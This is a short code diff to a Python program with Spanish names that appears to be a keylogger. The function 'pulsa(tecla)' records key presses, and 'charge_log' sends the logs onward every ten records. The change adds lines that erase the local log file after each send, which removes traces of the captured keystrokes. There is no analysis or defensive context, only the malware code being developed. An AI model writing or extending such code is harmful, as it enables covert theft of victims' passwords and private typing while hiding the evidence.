@@ -49,6 +49,9 @@ def charge_log(log,logs):
 	if registros >= 10:
 		send_logs(nombre_archivo,date_log)
 		registros = 0
+		with open(nombre_archivo, "w") as archivo:
+			archivo.write("")
+		archivo.close()
 
 def pulsa(tecla):
 	if len(recoleccion) >= 1000:
